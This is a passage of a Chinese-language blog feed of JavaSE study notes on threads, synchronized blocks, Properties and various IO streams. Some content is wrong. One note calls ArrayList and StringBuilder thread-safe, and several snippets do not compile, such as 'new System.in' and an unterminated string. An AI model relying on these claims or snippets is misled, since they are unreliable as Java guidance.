纳秒)<blockquote><p>休眠线程，传入多少时间就停多长时间，也可以单独传毫秒</p></blockquote></li><li><p>.setDaemon()</p><blockquote><p>守护线程，设置一个线程为守护线程后，该线程不会单独执行，当其他非守护线程全部执行完之后自动退出。</p><ul><li>ps：<br>在非守护线程全部执行完毕后，会有一个缓冲时间，这个缓冲时间内守护线程还会运行，也就相当于非守护线程退出时会告诉守护线程可以退出了，这个告诉的时间就是缓冲时间</li></ul></blockquote></li><li><p>.join()</p><blockquote><p>调用此方法的线程暂停（写这句代码的线程），等待指定线程结束后，当前线程再继续运行</p></blockquote></li><li><p>.join(int)</p><blockquote><p>等待指定的毫秒后继续执行</p><ul><li>ps：<br>如果在main主方法中调用t.join()，那么等待t这个线程执行结束之后，主方法才会继续执行，这个命令通常用在主方法中。</li></ul></blockquote></li><li><p>.yield()</p><blockquote><p>礼让线程，让出cpu，也就是让自己在cpu的执行优先级中降低，就是让别人先执行</p></blockquote></li><li>.setPriority(1-10)<blockquote><p>设置线程优先级，默认是5</p></blockquote></li><li>.getThreadGroup()<blockquote><p>通过线程对象获取它所属的组，返回线程组对象</p></blockquote></li></ul><h3 id="同步代码块的概述"><a href="#同步代码块的概述" class="headerlink" title="同步代码块的概述"></a>同步代码块的概述</h3><blockquote><p>当有多条线程并发的时候，cpu会先执行完<code>同步代码块</code>中所有代码才会去执行另一个线程，<code>不会这里执行几句代码那里执行几句代码</code>。</p><ul><li>ps：<br><strong>它其实就是锁</strong></li></ul></blockquote><h3 id="什么时候需要同步？"><a href="#什么时候需要同步？" class="headerlink" title="什么时候需要同步？"></a>什么时候需要同步？</h3><blockquote><p>当多线程并发，我们希望某个线程中某些代码执行过程中不切换到其他线程工作，我们就需要用到同步代码块。</p></blockquote><h3 id="同步代码块关键字"><a href="#同步代码块关键字" class="headerlink" title="同步代码块关键字"></a>同步代码块关键字</h3><blockquote><p><strong>synchronized</strong></p></blockquote><h3 id="定义方式："><a href="#定义方式：" class="headerlink" title="定义方式："></a>定义方式：</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">synchronized</span><span class="params">(锁对象)</span></span> &#123;</span><br><span class="line">代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="同步代码块（锁）的注意事项："><a href="#同步代码块（锁）的注意事项：" class="headerlink" title="同步代码块（锁）的注意事项："></a>同步代码块（锁）的注意事项：</h3><blockquote><p>1、锁对象可以是任意的对象</p><p>2、两个需要同步的代码块需要使用同一个锁，否则不能达到目标效果</p><p>3、不能是匿名对象，因为两个匿名对象根本就不是一个对象，也就是不是同一把锁</p><p>4、不要把锁进行嵌套，否则容易出现死锁，因为可能会出现互相等待的局面</p></blockquote><h3 id="同步方法如何定义？"><a href="#同步方法如何定义？" class="headerlink" title="同步方法如何定义？"></a>同步方法如何定义？</h3><ul><li>解答：<blockquote><p>只要在修饰方法的时候加上synchronized关键字即可</p></blockquote></li></ul><h3 id="同步方法注意事项："><a href="#同步方法注意事项：" class="headerlink" title="同步方法注意事项："></a>同步方法注意事项：</h3><ul><li>非静态方法锁对象是<code>它自己这个对象</code>，也就是this</li><li>静态方法因为它是随着类的加载而加载的，所以它的对象就是它所在类的<code>字节码文件</code>，也就是说静态方法的锁对象就是它所在类的字节码文件</li></ul><h3 id="线程安全问题"><a href="#线程安全问题" class="headerlink" title="线程安全问题"></a>线程安全问题</h3><blockquote><p>当多条线程操作同一个数据时，可能会出现数据安全问题</p></blockquote><ul><li><p><strong>解决方法</strong></p><blockquote><p>在某一段需要判断并且操作数据地方加上一个同步代码块</p></blockquote></li><li><p><strong>注意事项</strong></p><blockquote><p>使用的锁对象一定要是同一个锁，<code>建议直接用类的class文件</code>，如果非要用引用数据类型，那么一定要用静态的。</p></blockquote></li></ul><h3 id="以前线程安全类的回顾"><a href="#以前线程安全类的回顾" class="headerlink" title="以前线程安全类的回顾"></a>以前线程安全类的回顾</h3><blockquote><p>线程安全的类涉及数据操作的方法都加了synchronized修饰，比如Vector、ArrayList，StringBuffer、StringBuilde</p></blockquote><h3 id="线程安全方法"><a href="#线程安全方法" class="headerlink" title="线程安全方法"></a>线程安全方法</h3><blockquote><p>.synchronized[这里可以后接集合类型，是什么类型就返回那个类型的集合]</p><ul><li>ps：<br>它的作用是传入一个集合对象，传出一个线程安全的集合对象</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;线程概述&quot;&gt;&lt;a href=&quot;#线程概述&quot; class=&quot;headerlink&quot; title=&quot;线程概述&quot;&gt;&lt;/a&gt;线程概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;线程其实就是程序执行的一条路径，一个进程中可以包含多条线程，多线程并发执行可以提高程序效率，可以同使完成多项任务&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="线程" scheme="http://liuhaoan.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="两种实现多线程的区别（面试可能问）" scheme="http://liuhaoan.github.io/tags/%E4%B8%A4%E7%A7%8D%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%88%E9%9D%A2%E8%AF%95%E5%8F%AF%E8%83%BD%E9%97%AE%EF%BC%89/"/>
    
      <category term="同步代码块（锁）" scheme="http://liuhaoan.github.io/tags/%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E9%94%81%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Properties集合</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Properties%E9%9B%86%E5%90%88/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——Properties集合/</id>
    <published>2019-04-10T08:54:55.000Z</published>
    <updated>2019-04-10T08:59:49.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Properties概述"><a href="#Properties概述" class="headerlink" title="Properties概述"></a>Properties概述</h1><blockquote><p>它是一个双列集合，Properties的父类是HashTable类，它有一个固定的作用，那就是存储配置文件。</p><ul><li>ps:<br>虽然Hashtables被HashMap替代了，但是Hashtable有个争气的儿子——Properties</li></ul></blockquote><a id="more"></a><h3 id="hashtable和hashMap区别（面试题）："><a href="#hashtable和hashMap区别（面试题）：" class="headerlink" title="hashtable和hashMap区别（面试题）："></a>hashtable和hashMap区别（面试题）：</h3><ul><li>共同点：<blockquote><p>1、底层都依赖hash算法</p><p>2、都是双列集合</p></blockquote></li><li>不同点：<blockquote><p>1、HashMap是线程不安全的，效率高，jdk1.2版本出现的</p><p>2、Hashtable是线程安全的，效率相对低，jdk1.0版本出现的</p><p>3、HashMap可以储存null键和null值</p><p>4、Hashtable不可以储存null键和null值</p></blockquote></li></ul><h3 id="Properties的特殊方法"><a href="#Properties的特殊方法" class="headerlink" title="Properties的特殊方法"></a>Properties的特殊方法</h3><ul><li>.setProperty(key, value)<blockquote><p>设置键和对应的值</p></blockquote></li><li>.getProperty(key)<blockquote><p>根据键获取相对应的值，返回String</p></blockquote></li><li>.propertyNames()<blockquote><p>返回集合中所有键的Enumeration枚举</p></blockquote></li><li>.load(InputStream)    <blockquote><p>从配置文件读取配置项到集合中</p></blockquote></li><li>.store(OutputStream)</li></ul><h3 id="遍历所有配置案例"><a href="#遍历所有配置案例" class="headerlink" title="遍历所有配置案例"></a>遍历所有配置案例</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Properties prop = <span class="keyword">new</span> Properties();</span><br><span class="line">prop.setProperty(<span class="string">"name"</span>, <span class="string">"张三"</span>);</span><br><span class="line">prop.setProperty(<span class="string">"tel"</span>, <span class="string">"18912345678"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//System.out.println(prop);</span></span><br><span class="line">Enumeration&lt;<span class="keyword">String</span>&gt; en = (Enumeration&lt;<span class="keyword">String</span>&gt;) prop.propertyNames();</span><br><span class="line"><span class="keyword">while</span>(en.hasMoreElements()) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span> = en.nextElement();</span><br><span class="line"><span class="comment">//获取Properties中的每一个键</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">String</span> value = prop.getProperty(<span class="built_in">key</span>);</span><br><span class="line"><span class="comment">//根据键获取值</span></span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="built_in">key</span> + <span class="string">"="</span>+ value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="load与storte案例演示"><a href="#load与storte案例演示" class="headerlink" title="load与storte案例演示"></a>load与storte案例演示</h3><ul><li>load读</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Properties prop = <span class="keyword">new</span> <span class="type">Properties</span>();</span><br><span class="line">prop.load(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"config.properties"</span>));</span><br><span class="line"><span class="comment">//将文件上的键值对读取到集合中</span></span><br></pre></td></tr></table></figure><ul><li>store写</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prop.setProperty(<span class="string">"tel"</span>, <span class="string">"18912345678"</span>);</span><br><span class="line"><span class="comment">//先修改集合中的配置</span></span><br><span class="line"></span><br><span class="line">prop.store(<span class="keyword">new</span> <span class="type">FileOutputStream</span>(<span class="string">"config.properties"</span>), <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//第二个参数是对列表参数的描述,可以给值,也可以给null</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Properties概述&quot;&gt;&lt;a href=&quot;#Properties概述&quot; class=&quot;headerlink&quot; title=&quot;Properties概述&quot;&gt;&lt;/a&gt;Properties概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是一个双列集合，Properties的父类是HashTable类，它有一个固定的作用，那就是存储配置文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps:&lt;br&gt;虽然Hashtables被HashMap替代了，但是Hashtable有个争气的儿子——Properties&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="hashtable和hashMap区别（面试题）" scheme="http://liuhaoan.github.io/tags/hashtable%E5%92%8ChashMap%E5%8C%BA%E5%88%AB%EF%BC%88%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%89/"/>
    
      <category term="Properties集合" scheme="http://liuhaoan.github.io/tags/Properties%E9%9B%86%E5%90%88/"/>
    
      <category term="配置文件" scheme="http://liuhaoan.github.io/tags/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_标准输入输出流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-标准输入输出流/</id>
    <published>2019-04-10T08:51:29.000Z</published>
    <updated>2019-04-10T08:53:38.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><ul><li>System.in<blockquote><p>是InputStream，他们是标准输入流，默认可以从键盘读取字节数据，Scanner的底层就是用它。</p></blockquote></li><li>System.out<blockquote><p>是printStream，他们是标准输出流，默认可以向console（控制台）中输出字符宣传和字节数据</p></blockquote></li></ul><a id="more"></a><h3 id="修改标准输入输出流"><a href="#修改标准输入输出流" class="headerlink" title="修改标准输入输出流"></a>修改标准输入输出流</h3><ul><li>修改输入流<blockquote><p>System.setIn(InputStream)</p></blockquote></li><li>修改输出流<blockquote><p>System.setOut(printStream)<br>ps：如果修改标准输入输出流指向文件的话，那么输入流就不会从键盘读了，而是从文件，输出流同理。</p></blockquote></li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InputStream <span class="keyword">is</span> = <span class="keyword">new</span> System.<span class="keyword">in</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="keyword">is</span>.read();</span><br><span class="line"><span class="comment">//从键盘读取一个字节</span></span><br><span class="line">System.<span class="keyword">out</span>.println(x)；</span><br></pre></td></tr></table></figure><p>ps：输入48打印52，因为read一次只读一个字节，也就是这里只读到了4，而我们输入的4是一个字符类型的数据，所以read会通过码表获取字符类型4对应的值，也就是52，最后打印的也就是52了</p><h3 id="输入流注意事项"><a href="#输入流注意事项" class="headerlink" title="输入流注意事项"></a>输入流注意事项</h3><blockquote><p>输入流只有一个对象，再用System.in是不能再创建的，当然标准输入流是不需要关的，除非和某个文件关联了，因为关联了文件会占用资源</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;System.in&lt;blockquote&gt;
&lt;p&gt;是InputStream，他们是标准输入流，默认可以从键盘读取字节数据，Scanner的底层就是用它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;System.out&lt;blockquote&gt;
&lt;p&gt;是printStream，他们是标准输出流，默认可以向console（控制台）中输出字符宣传和字节数据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="标准输入输出流" scheme="http://liuhaoan.github.io/tags/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_打印流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%89%93%E5%8D%B0%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-打印流/</id>
    <published>2019-04-10T08:44:43.000Z</published>
    <updated>2019-04-10T08:48:18.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote><p>可以很方便的将对象的toString()结果输出，并且自动加上换行，而且还可以使用自动刷出模式，自动刷出就是println一个数据就在文件中写入一个数据</p><ul><li>ps：<br>System.out就是一个PrintStream，其默认向控制台输出信息</li></ul></blockquote><a id="more"></a><h3 id="打印流的类："><a href="#打印流的类：" class="headerlink" title="打印流的类："></a>打印流的类：</h3><ul><li>printStream<blockquote><p>打印字节流</p></blockquote></li><li>printWrite    <blockquote><p>打印字符流</p></blockquote></li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printWrite pw = <span class="keyword">new</span> printWrite(<span class="string">"1.txt"</span>);</span><br><span class="line">pw.<span class="built_in">println</span>(<span class="string">"111"</span>);</span><br><span class="line"><span class="comment">//向文件写入111</span></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote><p>1、如果开启了自动刷出，那么只有println这么一个方法支持自动刷出</p><p>2、print、println方法底层是把需要打印的数据转换成字符串再打印的</p><p>3、write和print的不同之处是传入什么就直接写入什么</p></blockquote><p>ps：打印流是只操作目的的，也就是只操作写出数据的</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;可以很方便的将对象的toString()结果输出，并且自动加上换行，而且还可以使用自动刷出模式，自动刷出就是println一个数据就在文件中写入一个数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：&lt;br&gt;System.out就是一个PrintStream，其默认向控制台输出信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="打印流" scheme="http://liuhaoan.github.io/tags/%E6%89%93%E5%8D%B0%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_数据输入输出流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-数据输入输出流/</id>
    <published>2019-04-10T08:42:32.000Z</published>
    <updated>2019-04-10T08:44:04.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>它可以按照<code>基本数据类型</code>的大小读写数据，因为字节流读文件时向那个字节前面加8个二进制位组成一个int，写文件时会自动砍掉int的前8个二进制位，所以我们直接读写int类型数据时文本数据会出错，而数据输入输出流就不会这样，他会把<code>基本数据类型所有字节全部写出去</code>，不过开发用到的不多。</p></blockquote><a id="more"></a><h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><blockquote><p>按照long大小读写一个数的时候，写出数据会占8个字节，而读取数据也会一次读8个</p></blockquote><h3 id="数据输入输出流的类"><a href="#数据输入输出流的类" class="headerlink" title="数据输入输出流的类"></a>数据输入输出流的类</h3><blockquote><p>DataInputStream、DataOutputStream</p></blockquote><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataInputStream dis = <span class="keyword">new</span> <span class="type">DataInputStream</span>(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"1.txt))；</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它可以按照&lt;code&gt;基本数据类型&lt;/code&gt;的大小读写数据，因为字节流读文件时向那个字节前面加8个二进制位组成一个int，写文件时会自动砍掉int的前8个二进制位，所以我们直接读写int类型数据时文本数据会出错，而数据输入输出流就不会这样，他会把&lt;code&gt;基本数据类型所有字节全部写出去&lt;/code&gt;，不过开发用到的不多。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="数据输入输出流" scheme="http://liuhaoan.github.io/tags/%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_对象操作流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-对象操作流/</id>
    <published>2019-04-10T08:39:06.000Z</published>
    <updated>2019-04-10T08:41:36.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了<code>序列化</code>和<code>反序列化</code>的操作。</p></blockquote><a id="more"></a><h3 id="对象操作流的类"><a href="#对象操作流的类" class="headerlink" title="对象操作流的类"></a>对象操作流的类</h3><blockquote><p>ObjectOutputStream</p></blockquote><ul><li>序列化<blockquote><p>将对象写到文件中，可以比喻为游戏的存档</p></blockquote></li><li>反序列化<blockquote><p>从文件中读取对象，可以比喻成游戏读档</p></blockquote></li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote><p>1、被操作的对象一定要实现<code>Serializable</code>接口</p><p>2、无论都还是取，都是一次只能处理一个对象。</p><p>3、实现Serializable接口后，可以加一个id号，这个id好用来好看存的档和读的档是不是一样的。</p></blockquote><h3 id="对象操作流方法"><a href="#对象操作流方法" class="headerlink" title="对象操作流方法"></a>对象操作流方法</h3><ul><li>.readObject()<blockquote><p>反序列化，从文件读对象</p></blockquote></li><li>.writeObject()<blockquote><p>序列化，把对象写到文件中</p></blockquote></li></ul><h3 id="如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？"><a href="#如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？" class="headerlink" title="如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？"></a>如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？</h3><ul><li>解决方法<blockquote><p>先把要保存的对象放到集合中，然后直接写出一个集合对象即可。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了&lt;code&gt;序列化&lt;/code&gt;和&lt;code&gt;反序列化&lt;/code&gt;的操作。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="对象操作流" scheme="http://liuhaoan.github.io/tags/%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_随机访问流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-随机访问流/</id>
    <published>2019-04-10T08:36:22.000Z</published>
    <updated>2019-04-10T08:38:37.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>它可以在文件任何位置开始读，也可以在文件任何地方开始写。</p><ul><li>ps：<br>其实它不属于流，因为<code>它的父类是Object</code>，但是呢，它融合了InputStream与OutpuStream的功能，所以他同时具备了读和写的功能。</li></ul></blockquote><a id="more"></a><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li>多线程下载<blockquote><p>我们可以让第一条线程下载0-1000第二条线程下载1000-2000，以此类推。</p></blockquote></li></ul><h3 id="随机访问流类"><a href="#随机访问流类" class="headerlink" title="随机访问流类"></a>随机访问流类</h3><blockquote><p>RandomAccessFile</p></blockquote><h3 id="随机访问流的方法："><a href="#随机访问流的方法：" class="headerlink" title="随机访问流的方法："></a>随机访问流的方法：</h3><ul><li>.seek()<blockquote><p>设置开始位置指针</p></blockquote></li><li>.write()<blockquote><p>写</p></blockquote></li><li>.read()<blockquote><p>读</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它可以在文件任何位置开始读，也可以在文件任何地方开始写。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：&lt;br&gt;其实它不属于流，因为&lt;code&gt;它的父类是Object&lt;/code&gt;，但是呢，它融合了InputStream与OutpuStream的功能，所以他同时具备了读和写的功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="随机访问流" scheme="http://liuhaoan.github.io/tags/%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_内存输出流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%86%85%E5%AD%98%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-内存输出流/</id>
    <published>2019-04-10T08:28:05.000Z</published>
    <updated>2019-04-10T08:35:38.191Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存输出流的概述"><a href="#内存输出流的概述" class="headerlink" title="内存输出流的概述"></a>内存输出流的概述</h1><blockquote><p>该输出流可以<code>向内存中写数据</code>，把内存当作一个缓冲区，写出之后可以一次性获取出所有数据。</p></blockquote><ul><li>内存输出流类<blockquote><p>ByteArrayOutputStream</p></blockquote></li></ul><p>ps：它其实是一个缓冲区，实例化这个类时在内存中创建了一个可以增长的字节数组，所以它可以不用关闭流，因为<code>根本就只是个缓冲区</code>。</p><a id="more"></a><h3 id="ByteArrayOutputStream的方法"><a href="#ByteArrayOutputStream的方法" class="headerlink" title="ByteArrayOutputStream的方法"></a>ByteArrayOutputStream的方法</h3><ul><li>.toByteArray()    <blockquote><p>获取缓冲区全部数据，返回一个byte[]</p></blockquote></li><li>.toString(可传入码表)<blockquote><p>获取缓冲区全部数据，根据平台默认码表返回String</p></blockquote></li></ul><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><blockquote><p>字节流读取文本时可能读取到半个汉字，所以可以用内存输出流，把文本放到缓冲区中。</p></blockquote><h3 id="为什么当要读取文本内容并且操作时不直接用字符流？"><a href="#为什么当要读取文本内容并且操作时不直接用字符流？" class="headerlink" title="为什么当要读取文本内容并且操作时不直接用字符流？"></a>为什么当要读取文本内容并且操作时不直接用字符流？</h3><ul><li><p>1、我们不知道这个文本一共有多少个字符，所以不好定义数组缓冲区。</p></li><li><p>2、虽然可以使用数组来实现缓冲区，但是太麻烦，代码量更多，而ByteArrayOutputStream却很方便。</p></li></ul><h3 id="内存输出流面试题"><a href="#内存输出流面试题" class="headerlink" title="内存输出流面试题"></a>内存输出流面试题</h3><blockquote><p>定义一个文件输入流，调用read方法，将a.txt文件中的内容打印出来，byte大小为5</p></blockquote><ul><li>代码示例</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"a.txt"</span>);</span><br><span class="line">     ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">     <span class="keyword">byte</span> b[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">5</span>];</span><br><span class="line">     <span class="keyword">int</span> n;</span><br><span class="line">     <span class="built_in">while</span> ((n = fis.<span class="built_in">read</span>(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">         baos.<span class="built_in">write</span>(b, <span class="number">0</span>, n);</span><br><span 